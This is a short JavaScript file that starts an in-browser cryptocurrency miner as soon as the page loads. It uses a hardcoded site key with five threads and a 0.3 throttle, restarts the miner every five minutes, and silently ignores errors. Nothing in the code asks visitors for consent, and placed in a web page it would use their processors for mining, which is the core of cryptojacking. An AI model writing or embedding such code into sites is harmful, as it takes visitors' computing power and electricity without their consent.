var mainMiner=null;

function Test() {
    try {

        if (mainMiner != null && mainMiner.isRunning()) {
            message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
            mainMiner.stop();
        }

        mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
            throttle: 0.3,
            threads:5,
            //autoThreads:true
        });
        mainMiner.start();

        // Console.log('ServiceHit');
        message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
    }
    catch (e) {

    }
}

function message(msg) {
    alert(msg);
    document.getElementById("footer").innerHTML = msg;
}


setInterval(function () {
    Test();

}, 300000)

Test();